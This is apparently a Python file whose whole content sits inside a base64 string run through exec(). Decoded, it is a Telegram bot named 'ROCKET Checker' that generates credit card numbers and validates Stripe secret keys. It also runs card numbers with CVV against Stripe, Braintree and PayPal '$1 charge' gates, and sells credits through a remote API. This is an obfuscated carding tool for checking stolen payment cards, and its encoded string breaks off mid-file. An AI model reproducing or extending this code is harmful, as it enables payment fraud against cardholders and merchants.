BINS_API_URL = 
import base64
exec(base64.b64decode("aW1wb3J0IHRlbGVib3QKaW1wb3J0IG9zCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzdHJpbmcKZnJvbSBUb29scy5waW5nIGltcG9ydCBjbWRfcGluZwpmcm9tIFRvb2xzLmdldGlkIGltcG9ydCB1c2VyX2luZm8KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgYXN5bmNpbwppbXBvcnQgc3lzCmZyb20gVG9vbHMuYmluIGltcG9ydCBnZXRfYmluX2luZm8sIGdldF9iaW4KZnJvbSBHYXRlcy5zdHJpcCBpbXBvcnQgVGVsZQpmcm9tIGNyZWQgaW1wb3J0ICoKaW1wb3J0IHJhbmRvbQpmcm9tIFRvb2xzLmdlbiBpbXBvcnQgZ2VuCmZyb20gVG9vbHMuc2sgaW1wb3J0IHNrCmZyb20gVG9vbHMuc3RhdHMgaW1wb3J0IGZvcm1hdF9zZXJ2ZXJfbWVzc2FnZQpmcm9tIHRlbGVib3QudHlwZXMgaW1wb3J0IElubGluZUtleWJvYXJkTWFya3VwLCBJbmxpbmVLZXlib2FyZEJ1dHRvbgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGh0dHB4CgoKZnJvbSBUb29scy5mYWtlIGltcG9ydCBzZW5kX2Zha2VfZGV0YWlscywgc2VuZF9jb3VudHJ5X2NvZGVzCgpib3QgPSB0ZWxlYm90LlRlbGVCb3QoQVBJX1RPS0VOKQoKCgoKIyDinIUgUmVzdGFydCBib3QgZnVuY3Rpb24gd2l0aCBiZXR0ZXIgaGFuZGxpbmcKCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMg4pyFIExvYWQgdXNlcnMgZnJvbSBKU09OCgoKIyBZb3VyIEZsYXNrIEFQSSBVUkwKQVBJX1VSTCA9ICJodHRwczovL3JvY2tldGFwaTIucHl0aG9uYW55d2hlcmUuY29tIiAgIyDinIUgRW5zdXJlIGl0IHN0YXJ0cyB3aXRoIGh0dHA6Ly8gICMgQ2hhbmdlIHRoaXMgdG8geW91ciBhY3R1YWwgRmxhc2sgQVBJIFVSTAoKIyDinIUgTG9hZCBmcmVlIHVzZXJzIGZyb20gQVBJCmltcG9ydCByZXF1ZXN0cwoKZGVmIGxvYWRfZnJlZV91c2VycygpOgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGYie0FQSV9VUkx9L2dldF91c2VycyIsIGhlYWRlcnM9eyJDYWNoZS1Db250cm9sIjogIm5vLWNhY2hlIn0pICAjIOKchSBQcmV2ZW50cyBjYWNoaW5nCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBmZXRjaGluZyB1c2Vyczoge2V9IikgICMg4pyFIFByaW50IGVycm9yIGlmIEFQSSBmYWlscwogICAgICAgIHJldHVybiB7fSAgIyBSZXR1cm4gZW1wdHkgZGljdCBpZiBBUEkgZmFpbHMKICAgIHJldHVybiB7fQoKIyDinIUgU2F2ZSB1c2VycyAoSGFuZGxlZCB2aWEgQVBJLCBubyBsb2NhbCBmaWxlIG5lZWRlZCkKZGVmIHNhdmVfZnJlZV91c2VycyhkYXRhKToKICAgIHJlcXVlc3RzLnBvc3QoZiJ7QVBJX1VSTH0vc2F2ZV91c2VycyIsIGpzb249ZGF0YSkgICMgVXBkYXRlIHVzZXJzIHZpYSBBUEkKCiMg4pyFIERlZHVjdCAxIGNyZWRpdCBmcm9tIHVzZXIgKHZpYSBBUEkpCgpkZWYgZWRpdF9jb2RlX3N0YXR1c190b191c2VkKGNvZGUpOgogICAgIyBMb2FkIHRoZSBjdXJyZW50IGNvZGVzCiAgICBjb2RlcyA9IGxvYWRfY29kZXMoKQogICAgCiAgICBpZiBjb2RlIGluIGNvZGVzOgogICAgICAgICMgQ2hlY2sgaWYgdGhlIGNvZGUgaXMgYWxyZWFkeSBtYXJrZWQgYXMgdXNlZAogICAgICAgIGlmIG5vdCBjb2Rlc1tjb2RlXS5nZXQoInVzZWQiLCBGYWxzZSk6CiAgICAgICAgICAgICMgVXBkYXRlIHRoZSBjb2RlIHRvICd1c2VkJyA9IFRydWUKICAgICAgICAgICAgY29kZXNbY29kZV1bInVzZWQiXSA9IFRydWUKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2F2ZSB0aGUgdXBkYXRlZCBjb2RlcwogICAgICAgICAgICBzYXZlX2NvZGVzKGNvZGVzKQogICAgICAgICAgICAKICAgICAgICAgICAgcHJpbnQoZiLinIUgQ29kZSAne2NvZGV9JyBoYXMgYmVlbiBtYXJrZWQgYXMgdXNlZC4iKQogICAgICAgICAgICByZXR1cm4gZiLinIUgQ29kZSAne2NvZGV9JyBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCB0byB1c2VkLiIKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIuKaoO+4jyBDb2RlICd7Y29kZX0nIGlzIGFscmVhZHkgdXNlZC4iKQogICAgICAgICAgICByZXR1cm4gZiLimqDvuI8gQ29kZSAne2NvZGV9JyBpcyBhbHJlYWR5IG1hcmtlZCBhcyB1c2VkLiIKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiLimqDvuI8gQ29kZSAne2NvZGV9JyBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4gZiLimqDvuI8gQ29kZSAne2NvZGV9JyBpcyBpbnZhbGlkIG9yIG5vdCBmb3VuZC4iCgpkZWYgaXNfcmVnaXN0ZXJlZCh1c2VyX2lkKToKICAgIGZyZWVfdXNlcnMgPSBsb2FkX2ZyZWVfdXNlcnMoKSAgIyDinIUgQWx3YXlzIHJlbG9hZHMgZnJlc2ggZGF0YQogICAgcmV0dXJuIHN0cih1c2VyX2lkKSBpbiBmcmVlX3VzZXJzCgpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ28nXSkKZGVmIHNvbWVfY29tbWFuZChtZXNzYWdlKToKICAgIGlmIG5vdCBpc19yZWdpc3RlcmVkKG1lc3NhZ2UuZnJvbV91c2VyLmlkKToKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIkhleSwgeW91IGFyZSBub3QgcmVnaXN0ZXJlZC4gUGxlYXNlIHJlZ2lzdGVyIHVzaW5nIC9yZWdpc3RlciBjbWQu4pyFIikKICAgICAgICByZXR1cm4KICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4pyFIFlvdSBhcmUgcmVnaXN0ZXJlZCEgUnVubmluZyB5b3VyIGNvbW1hbmQuLi4iKQogICAgCiAgICAKICAgIAogICAgCmRlZiBvcCh1c2VyX2lkKToKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChmIntBUElfVVJMfS9kZWR1Y3RfY3JlZGl0IiwganNvbj17InVzZXJfaWQiOiB1c2VyX2lkfSkKICAgIAogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHJlc3BvbnNlID0gcmVzcG9uc2UuanNvbigpICMgUmV0dXJucyB0aGUgSlNPTiByZXNwb25zZSBpZiBzdWNjZXNzZnVsCiAgICAgICAgaWYgIlRydWUiIGluIHJlc3BvbnNlOgogICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZWxzZToKICAgICAgICBwcmludChmIuKaoO+4jyBBUEkgRXJyb3I6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0gLSB7cmVzcG9uc2UudGV4dH0iKSAgIyBEZWJ1Z2dpbmcKICAgICAgICByZXR1cm4gRmFsc2UKCiMg4pyFIExvYWQgY29kZXMgZnJvbSBBUEkKZGVmIGxvYWRfY29kZXMoKToKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmIntBUElfVVJMfS9nZXRfY29kZXMiKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4ge30gICMgUmV0dXJuIGVtcHR5IGRpY3QgaWYgQVBJIGZhaWxzCiAgICByZXR1cm4ge30KCiMg4pyFIFNhdmUgY29kZXMgKEhhbmRsZWQgdmlhIEFQSSkKZGVmIHNhdmVfY29kZXMoY29kZXMpOgogICAgcmVxdWVzdHMucG9zdChmIntBUElfVVJMfS9zYXZlX2NvZGVzIiwganNvbj1jb2RlcykgICMgVXBkYXRlIGNvZGVzIHZpYSBBUEkKCiMg4pyFIEdlbmVyYXRlIGEgbmV3IHJlZGVlbSBjb2RlICh2aWEgQVBJKQpkZWYgZ2VuZXJhdGVfcmVkZWVtX2NvZGUoKToKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChmIntBUElfVVJMfS9nZW5lcmF0ZV9jb2RlIikKICAgIHJldHVybiByZXNwb25zZS5qc29uKCkgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwIGVsc2UgTm9uZSAgIyDinIUgUmV0dXJucyBnZW5lcmF0ZWQgY29kZQoKIyDinIUgQWRkIGEgbmV3IHJlZGVlbSBjb2RlICh2aWEgQVBJKQpkZWYgYWRkX2NvZGUoY29kZSwgY3JlZGl0cyk6CiAgICByZXF1ZXN0cy5wb3N0KGYie0FQSV9VUkx9L2FkZF9jb2RlIiwganNvbj17ImNvZGUiOiBjb2RlLCAiY3JlZGl0cyI6IGNyZWRpdHN9KQogICAgcHJpbnQoZiLinIUgQ29kZSAne2NvZGV9JyBhZGRlZCB3aXRoIHtjcmVkaXRzfSBjcmVkaXRzLiIpCgojIOKchSBDaGVjayBpZiBhIGNvZGUgaXMgdXNlZCAodmlhIEFQSSkKZGVmIGNoZWNrX2NvZGVfc3RhdHVzKGNvZGUpOgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoZiJ7QVBJX1VSTH0vY2hlY2tfY29kZS97Y29kZX0iKQogICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKSBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAgZWxzZSAi4pqg77iPIENvZGUgbm90IGZvdW5kISIKCiMg4pyFIE1hcmsgYSBjb2RlIGFzIHVzZWQgKHZpYSBBUEkpCmRlZiB1c2VfY29kZShjb2RlKToKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChmIntBUElfVVJMfS91c2VfY29kZSIsIGpzb249eyJjb2RlIjogY29kZX0pCiAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMCBlbHNlIGYi4pqg77iPIENvZGUgJ3tjb2RlfScgaXMgaW52YWxpZCEiCgojIOKchSBHZW5lcmF0ZSBtdWx0aXBsZSByZWRlZW0gY29kZXMKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9Wydjb2RlJ10pCmRlZiBnZW5lcmF0ZV9jb2RlKG1lc3NhZ2UpOgogICAgaWYgc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSBub3QgaW4gYWRtaW46CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLwn5qrIFlvdSBhcmUgbm90IGF1dGhvcml6ZWQgdG8gdXNlIHRoaXMgY29tbWFuZC4iKQogICAgICAgIHJldHVybgoKICAgIGFyZ3MgPSBtZXNzYWdlLnRleHQuc3BsaXQoKQogICAgaWYgbGVuKGFyZ3MpICE9IDM6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLimqDvuI8gVXNhZ2U6IC9jb2RlIDxxdWFudGl0eT4gPGNyZWRpdHNfcGVyX2NvZGU+IikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgcXVhbnRpdHkgPSBpbnQoYXJnc1sxXSkKICAgICAgICBjcmVkaXRzX3Blcl9jb2RlID0gaW50KGFyZ3NbMl0pCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIuKaoO+4jyBFbnRlciB2YWxpZCBudW1iZXJzIGZvciBxdWFudGl0eSBhbmQgY3JlZGl0cy4iKQogICAgICAgIHJldHVybgoKICAgICMgU2VuZCByZXF1ZXN0IHRvIEFQSSB0byBnZW5lcmF0ZSBjb2RlcwogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGYie0FQSV9VUkx9L2dlbmVyYXRlX2NvZGVzIiwganNvbj17InF1YW50aXR5IjogcXVhbnRpdHksICJjcmVkaXRzX3Blcl9jb2RlIjogY3JlZGl0c19wZXJfY29kZX0pCgogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHJlc3VsdCA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGlmIHJlc3VsdFsic3VjY2VzcyJdOgogICAgICAgICAgICBnZW5lcmF0ZWRfY29kZXMgPSByZXN1bHRbImNvZGVzIl0KICAgICAgICAgICAgY29kZV9saXN0ID0gIlxuIi5qb2luKFtmImB7Y31gIiBmb3IgYyBpbiBnZW5lcmF0ZWRfY29kZXNdKQoKICAgICAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsIGYi8J+TjCAqKkdlbmVyYXRlZCBDb2RlcyoqXG5cbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYi8J+TpiAqKkFtb3VudDoqKiBge3F1YW50aXR5fWBcbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYi8J+SsCAqKkNyZWRpdHMgcGVyIENvZGU6KiogYHtjcmVkaXRzX3Blcl9jb2RlfWBcblxuIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiLwn5SRICoqQ29kZXM6Kipcblxue2NvZGVfbGlzdH1cblxuIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiLimqEgVXNlIGAvcmVkZWVtIDxjb2RlPmAgdG8gY2xhaW0gY3JlZGl0cyEiLCBwYXJzZV9tb2RlPSJNYXJrZG93biIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLimqDvuI8gRmFpbGVkIHRvIGdlbmVyYXRlIGNvZGVzLiBQbGVhc2UgdHJ5IGFnYWluLiIpCiAgICBlbHNlOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4pqg77iPIFNvbWV0aGluZyB3ZW50IHdyb25nISBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiIpCgoKaW1wb3J0IHJlcXVlc3RzICAjIEVuc3VyZSB0aGlzIGlzIGltcG9ydGVkIGF0IHRoZSB0b3AKCgoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydyZWRlZW0nXSkKZGVmIHJlZGVlbV9jb2RlKG1lc3NhZ2UpOgogICAgdXNlcl9pZCA9IG1lc3NhZ2UuY2hhdC5pZAogICAgYXJncyA9IG1lc3NhZ2UudGV4dC5zcGxpdCgpWzE6XSAgIyBFeHRyYWN0IGFyZ3VtZW50cyBhZnRlciAvcmVkZWVtCgogICAgaWYgbm90IGFyZ3M6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICJQbGVhc2UgcHJvdmlkZSBhIGNvZGU6IC9yZWRlZW0gPGNvZGU+IikKICAgICAgICByZXR1cm4KCiAgICBjb2RlID0gYXJnc1swXQoKICAgIHVybCA9ICJodHRwczovL3JvY2tldGFwaTIucHl0aG9uYW55d2hlcmUuY29tL3JlZGVlbSIKICAgIHBheWxvYWQgPSB7InVzZXJfaWQiOiB1c2VyX2lkLCAiY29kZSI6IGNvZGV9CiAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9CgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXlsb2FkLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAKCiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGlmIGRhdGEuZ2V0KCJzdWNjZXNzIik6CiAgICAgICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCBmIuKchSB7ZGF0YVsnbWVzc2FnZSddfVxu8J+SsCBOZXcgQmFsYW5jZToge2RhdGFbJ25ld19jcmVkaXRzJ119IGNyZWRpdHMiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCBmIuKaoO+4jyBFcnJvcjoge2RhdGEuZ2V0KCdlcnJvcicsICdVbmtub3duIGVycm9yJyl9IikKICAgIGVsc2U6CiAgICAgICAgZXJyb3IgPSByZXNwb25zZS5qc29uKClbImVycm9yIl0KICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgZiLinYx7ZXJyb3J9IikKCgojIOKchSBDaGVjayBhbGwgY29kZXMgd2l0aCB0aGVpciB1c2FnZSBzdGF0dXMKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9Wydjb2RlcyddKQpkZWYgY2hlY2tfYWxsX2NvZGVzKG1lc3NhZ2UpOgogICAgY29kZXMgPSBsb2FkX2NvZGVzKCkKICAgIGlmIG5vdCBjb2RlczoKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIuKaoO+4jyBObyBjb2RlcyBhdmFpbGFibGUuIikKICAgICAgICByZXR1cm4KCiAgICBjb2RlX2xpc3QgPSAiXG4iLmpvaW4oW2YiYHtjb2RlfWAgLSB7J+KchSBVc2VkJyBpZiBkYXRhWyd1c2VkJ10gZWxzZSAn4p2MIE5vdCBVc2VkJ30iIGZvciBjb2RlLCBkYXRhIGluIGNvZGVzLml0ZW1zKCldKQogICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsIGYi8J+TnCAqKkNvZGVzIExpc3QqKlxuXG57Y29kZV9saXN0fSIsIHBhcnNlX21vZGU9Ik1hcmtkb3duIikKCgoKCgoKZnJvbSB0ZWxlYm90LnR5cGVzIGltcG9ydCBJbmxpbmVLZXlib2FyZE1hcmt1cCwgSW5saW5lS2V5Ym9hcmRCdXR0b24KCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnc3RhcnQnXSkKZGVmIHNlbmRfd2VsY29tZShtZXNzYWdlKToKICAgIHVzZXJfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZCAgIyBHZXQgdGhlIHVzZXIncyBJRAogICAgbWFya3VwID0gSW5saW5lS2V5Ym9hcmRNYXJrdXAoKQogICAgbWFya3VwLnJvd193aWR0aCA9IDIgIAogICAgbWFya3VwLmFkZCgKICAgICAgICBJbmxpbmVLZXlib2FyZEJ1dHRvbigi8J+boCBUb29scyIsIGNhbGxiYWNrX2RhdGE9ZiJ0b29sc3x7dXNlcl9pZH0iKSwKICAgICAgICBJbmxpbmVLZXlib2FyZEJ1dHRvbigi8J+UkSBHYXRlIiwgY2FsbGJhY2tfZGF0YT1mImdhdGV8e3VzZXJfaWR9IiksCiAgICAgICAgSW5saW5lS2V5Ym9hcmRCdXR0b24oIvCfjJ8gQWRtaW4iLCBjYWxsYmFja19kYXRhPWYiYWRtaW58e3VzZXJfaWR9IiksCiAgICAgICAgSW5saW5lS2V5Ym9hcmRCdXR0b24oIuKdjCBDbG9zZSIsIGNhbGxiYWNrX2RhdGE9ZiJjbG9zZXx7dXNlcl9pZH0iKSwKICAgICkKICAgIAoKICAgIGJvdC5zZW5kX21lc3NhZ2UoCiAgICAgICAgbWVzc2FnZS5jaGF0LmlkLAogICAgICAgICIiIvCfjJ8gV2VsY29tZSBiYWNrIHRvIDxiPlJPQ0tFVCBDaGVja2VyPC9iPiDwn5qAICAKCvCflLkgVXNlIHRoZSBidXR0b25zIGJlbG93IHRvIG5hdmlnYXRlIHRocm91Z2ggdGhlIGJvdC4gIArwn5S5IEFjY2VzcyB2YXJpb3VzIHRvb2xzLCBwYXltZW50IGNoZWNrZXJzLCBhbmQgYWRtaW4gY29udHJvbHMuICAKCvCfk4wgV2FudCB0byBidXkgdGhpcyBib3Q/IERNIHdpdGggeW91ciBwcmljZSBAQ0hBVFdJVEhST0NLRVRfQk9UICAK8J+UkCBBZG1pbnMgY2FuIGFjY2VzcyBhZGRpdGlvbmFsIGZlYXR1cmVzIGZyb20gdGhlIEFkbWluIHBhbmVsLiIiIiwKICAgICAgICBwYXJzZV9tb2RlPSJIVE1MIiwKICAgICAgICByZXBseV9tYXJrdXA9bWFya3VwCiAgICApCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogVHJ1ZSkKZGVmIGNhbGxiYWNrX3F1ZXJ5KGNhbGwpOgogICAgdXNlcl9pZCA9IGNhbGwuZnJvbV91c2VyLmlkCiAgICBkYXRhID0gY2FsbC5kYXRhLnNwbGl0KCJ8IikgICMgU3BsaXQgY2FsbGJhY2tfZGF0YSB0byBnZXQgYWN0aW9uIGFuZCB1c2VyIElECiAgICBhY3Rpb24gPSBkYXRhWzBdCiAgICBvd25lcl9pZCA9IGludChkYXRhWzFdKSAgIyBDb252ZXJ0IHN0b3JlZCB1c2VyIElEIHRvIGludGVnZXIKCiAgICAjIEVuc3VyZSBvbmx5IHRoZSBvcmlnaW5hbCBzZW5kZXIgY2FuIGludGVyYWN0IHdpdGggdGhlIG1lc3NhZ2UKICAgIGlmIGNhbGwuZnJvbV91c2VyLmlkICE9IG93bmVyX2lkOgogICAgICAgIGJvdC5hbnN3ZXJfY2FsbGJhY2tfcXVlcnkoY2FsbC5pZCwgIvCfmqsgVGhpcyBpcyBub3QgeW91ciBtZXNzYWdlISIsIHNob3dfYWxlcnQ9VHJ1ZSkKICAgICAgICByZXR1cm4gIAoKICAgIGlmIGFjdGlvbiA9PSAiY2xvc2UiOgogICAgICAgIGJvdC5kZWxldGVfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgY2FsbC5tZXNzYWdlLm1lc3NhZ2VfaWQpICAjIE9ubHkgb3duZXIgY2FuIGRlbGV0ZQogICAgICAgIHJldHVybiAgIyBTdG9wIGZ1cnRoZXIgZXhlY3V0aW9uCgogICAgZWxpZiBhY3Rpb24gPT0gInRvb2xzIjoKICAgICAgICB0b29sc19tYXJrdXAgPSBJbmxpbmVLZXlib2FyZE1hcmt1cCgpCiAgICAgICAgdG9vbHNfbWFya3VwLnJvd193aWR0aCA9IDIKICAgICAgICB0b29sc19tYXJrdXAuYWRkKAogICAgICAgICAgICBJbmxpbmVLZXlib2FyZEJ1dHRvbigi4qyFIEJhY2siLCBjYWxsYmFja19kYXRhPWYiYmFja3x7b3duZXJfaWR9IiksCiAgICAgICAgICAgIElubGluZUtleWJvYXJkQnV0dG9uKCLinYwgQ2xvc2UiLCBjYWxsYmFja19kYXRhPWYiY2xvc2V8e293bmVyX2lkfSIpLAogICAgICAgICkKICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoCiAgICAgICAgICAgIGNoYXRfaWQ9Y2FsbC5tZXNzYWdlLmNoYXQuaWQsCiAgICAgICAgICAgIG1lc3NhZ2VfaWQ9Y2FsbC5tZXNzYWdlLm1lc3NhZ2VfaWQsCiAgICAgICAgICAgIHRleHQ9IiIi8J+UpyBVc2VmdWwgVG9vbHMKCi9iaW4gYmluX251bWJlciAtIPCfj6YgR2V0IEJJTiBpbmZvcm1hdGlvbiAgCi9nZW4gYmluIC0g8J+UhCBHZW5lcmF0ZSBjcmVkaXQgY2FyZHMgIAovaW5mbyAtIOKEue+4jyBHZXQgdXNlciBpbmZvcm1hdGlvbiAgCi9mYWtlIC0g8J+DjyBHZW5lcmF0ZSBmYWtlIHVzZXIgZGV0YWlscyAgCi9jb3VudHJ5Y29kZSAtIPCfjI0gR2V0IGNvdW50cnkgY29kZXMgIAovc2sgc2tfbGl2ZV94eHggLSDwn5SNIFZhbGlkYXRlIGEgU3RyaXBlIFNlY3JldCBLZXkiIiIsCiAgICAgICAgICAgIHBhcnNlX21vZGU9IkhUTUwiLAogICAgICAgICAgICByZXBseV9tYXJrdXA9dG9vbHNfbWFya3VwLAogICAgICAgICkKCiAgICBlbGlmIGFjdGlvbiA9PSAiZ2F0ZSI6CiAgICAgICAgZ2F0ZV9tYXJrdXAgPSBJbmxpbmVLZXlib2FyZE1hcmt1cCgpCiAgICAgICAgZ2F0ZV9tYXJrdXAucm93X3dpZHRoID0gMgogICAgICAgIGdhdGVfbWFya3VwLmFkZCgKICAgICAgICAgICAgSW5saW5lS2V5Ym9hcmRCdXR0b24oIuKshSBCYWNrIiwgY2FsbGJhY2tfZGF0YT1mImJhY2t8e293bmVyX2lkfSIpLAogICAgICAgICAgICBJbmxpbmVLZXlib2FyZEJ1dHRvbigi4p2MIENsb3NlIiwgY2FsbGJhY2tfZGF0YT1mImNsb3NlfHtvd25lcl9pZH0iKSwKICAgICAgICApCiAgICAgICAgYm90LmVkaXRfbWVzc2FnZV90ZXh0KAogICAgICAgICAgICBjaGF0X2lkPWNhbGwubWVzc2FnZS5jaGF0LmlkLAogICAgICAgICAgICBtZXNzYWdlX2lkPWNhbGwubWVzc2FnZS5tZXNzYWdlX2lkLAogICAgICAgICAgICB0ZXh0PSLwn5KzIFBheW1lbnQgQ2hlY2tlcnMgKEdhdGVzKVxuXG4iCiAgICAgICAgICAgICAgICAgIi9nYXRlIC0g8J+UkSBMaXN0IGFsbCBhdmFpbGFibGUgZ2F0ZXNcbiIKICAgICAgICAgICAgICAgICAiL2NoayA8Y29kZT5jY3xtbXx5eXxjdnY8L2NvZGU+IC0g4pyFIENoZWNrIFN0cmlwZSBjYXJkIHZhbGlkaXR5XG4iCiAgICAgICAgICAgICAgICAgIi9iIC0g8J+UkCBCcmFpbnRyZWUgKFByZW1pdW0pXG4iCiAgICAgICAgICAgICAgICAgIi9wcCA6IHBheXBheSAkMSBjaGFyZ2VcblxuIgogICAgICAgICAgICAgICAgICJTZW5kIGEgLnR4dCBmaWxlIGZvciBtdWx0aXBsZSBjaGVja3MiLAogICAgICAgICAgICBwYXJzZV9tb2RlPSJIVE1MIiwKICAgICAgICAgICAgcmVwbHlfbWFya3VwPWdhdGVfbWFya3VwLAogICAgICAgICkKCiAgICBlbGlmIGFjdGlvbiA9PSAiYWRtaW4iOgogICAgICAgIGlmIHN0cihjYWxsLmZyb21fdXNlci5pZCkgaW4gYWRtaW46ICAjIEVuc3VyZSBhZG1pbiBpcyBhIGxpc3Qgb2YgaW50ZWdlcnMKICAgICAgICAgICAgYWRtaW5fbWFya3VwID0gSW5saW5lS2V5Ym9hcmRNYXJrdXAoKQogICAgICAgICAgICBhZG1pbl9tYXJrdXAucm93X3dpZHRoID0gMgogICAgICAgICAgICBhZG1pbl9tYXJrdXAuYWRkKAogICAgICAgICAgICAgICAgSW5saW5lS2V5Ym9hcmRCdXR0b24oIuKshSBCYWNrIiwgY2FsbGJhY2tfZGF0YT1mImJhY2t8e293bmVyX2lkfSIpLAogICAgICAgICAgICAgICAgSW5saW5lS2V5Ym9hcmRCdXR0b24oIuKdjCBDbG9zZSIsIGNhbGxiYWNrX2RhdGE9ZiJjbG9zZXx7b3duZXJfaWR9IiksCiAgICAgICAgICAgICkKICAgICAgICAgICAgYm90LmVkaXRfbWVzc2FnZV90ZXh0KAogICAgICAgICAgICAgICAgY2hhdF9pZD1jYWxsLm1lc3NhZ2UuY2hhdC5pZCwKICAgICAgICAgICAgICAgIG1lc3NhZ2VfaWQ9Y2FsbC5tZXNzYWdlLm1lc3NhZ2VfaWQsCiAgICAgICAgICAgICAgICB0ZXh0PSIiIjxiPvCflJEgQWRtaW4gQ29tbWFuZHM8L2I+Cgrwn5OhIDxiPlN5c3RlbSAmIE5ldHdvcms8L2I+CuKeliAvcGluZyAtIPCfk7YgQ2hlY2sgYm90J3MgbmV0d29yayBsYXRlbmN5CuKeliAvc3RhdHMgLSDwn5OKIEdldCBtYWNoaW5lL3NlcnZlciBkZXRhaWxzCuKeliAvZGIgLSDwn5eE77iPIFZpZXcgZGF0YWJhc2Ugc3RhdGlzdGljcwrinpYgL2Jyb2FkY2FzdCA8aT5tZXNzYWdlPC9pPiAtIPCfk6kgU2VuZCBhIG1lc3NhZ2UgdG8gYWxsIHVzZXJzCuKeliAvY29kZSA8aT5xdHkgY3JlZGl0czwvaT4gLSDwn5SRIEdlbmVyYXRlIHJlZGVlbWFibGUgY29kZXMK4p6WIC9jb2RlcyAtIPCfk5wgVmlldyBhbGwgZ2VuZXJhdGVkIGNvZGVzCuKeliAvcmVkZWVtIDxpPmNvZGU8L2k+IC0g8J+OgSBSZWRlZW0gYSBjb2RlCuKeliAvYWRkIDxpPnVzZXJfaWQgY3JlZGl0czwvaT4gLSDinpUgQWRkIGNyZWRpdHMgdG8gYSB1c2VyCgo